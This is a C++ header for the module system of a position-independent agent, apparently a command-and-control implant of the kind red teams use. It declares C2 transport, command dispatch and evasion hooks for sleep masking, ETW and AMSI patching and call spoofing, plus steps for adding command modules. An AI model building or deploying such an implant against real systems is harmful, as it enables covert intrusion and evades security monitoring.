#ifndef STARBURST_MODULE_H
#define STARBURST_MODULE_H

#include <common.h>
#include <parser.h>

/*
 * Build-time module system for PIC agent.
 *
 * Module categories:
 *
 *   COMMAND - task handlers
 *     Guard: INCLUDE_CMD_<NAME>
 *     Interface: void cmd_<name>(instance&, char* task_uuid, Parser* params)
 *     Registration: CMD_ENTRY(NAME, cmd_id) in command_table.h
 *
 *   TRANSPORT - C2 communication
 *     Guard: <NAME>_TRANSPORT (one per build)
 *     Interface: transport_init, transport_send, transport_destroy
 *
 *   EVASION - sleep masking, unhooking, ETW patching, etc.
 *     Guard: INCLUDE_EVASION_<NAME>
 *     Interface: hooks into agent lifecycle (pre_sleep, post_sleep, etc.)
 *     Multiple active simultaneously.
 *
 * Adding a new command module:
 *   1. Create src/commands/cmd_<name>.cc  (guarded by #ifdef INCLUDE_CMD_<NAME>)
 *   2. Add handler declaration to commands.h
 *   3. Add CMD_<NAME> = 0xNN to config.h
 *   4. Add CMD_ENTRY(NAME, cmd_id) to command_table.h
 *   5. Add Python command file to agent_functions/
 *   6. Add to CMD_MAP in translator/utils.py
 *   Makefile wildcard auto-includes new .cc files.
 */

namespace starburst {

    /* ─── command module ─── */

    typedef void (*CmdHandlerFn)( instance& inst, char* task_uuid, Parser* params );

    struct CommandModule {
        uint8_t      cmd_id;
        CmdHandlerFn handler;
    };

    auto declfn dispatch_command(
        instance& inst, uint8_t cmd_id, char* task_uuid, Parser* params
    ) -> void;

    /* ─── evasion module ─── */

    auto declfn evasion_on_init( instance& inst ) -> void;
    auto declfn evasion_on_cleanup( instance& inst ) -> void;
    auto declfn evasion_pre_sleep( instance& inst ) -> void;
    auto declfn evasion_post_sleep( instance& inst ) -> void;

#if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
    auto declfn spoof_init( instance& inst ) -> void;
    auto declfn spoof_cleanup( instance& inst ) -> void;
    auto declfn spoof_call( instance& inst, FUNCTION_CALL* call ) -> ULONG_PTR;
#endif

#ifdef INCLUDE_EVASION_ETW
    auto declfn evasion_patch_etw( instance& inst ) -> void;
#endif
#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
    auto declfn evasion_patch_amsi( instance& inst ) -> void;
#endif

    /* ─── transport module (interface only - one active per build) ─── */

    auto declfn transport_init( instance& inst ) -> bool;
    auto declfn transport_send(
        instance& inst, uint8_t* data, uint32_t len,
        uint8_t** response, uint32_t* resp_len
    ) -> bool;
    auto declfn transport_destroy( instance& inst ) -> void;

}

#endif
